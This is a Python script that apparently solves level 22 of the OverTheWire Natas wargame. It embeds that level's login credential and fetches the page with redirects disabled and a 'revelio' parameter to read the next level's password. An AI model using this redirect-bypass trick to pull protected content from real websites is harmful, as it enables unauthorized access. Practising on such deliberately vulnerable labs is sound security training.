import requests
import re

URL = 'http://natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ@natas22.natas.labs.overthewire.org/'        

def no_redirect():
    r = requests.get(f"{URL}?revelio=harrypotter", allow_redirects=False)
    return re.findall(r"Password: [^<]*", r.text)[0].split(': ')[1]

if __name__ == '__main__':
    if requests.head(URL).status_code == requests.codes.ok:
        print(f'Password = {no_redirect()}')
    else:
        print('Authentication Failed!')
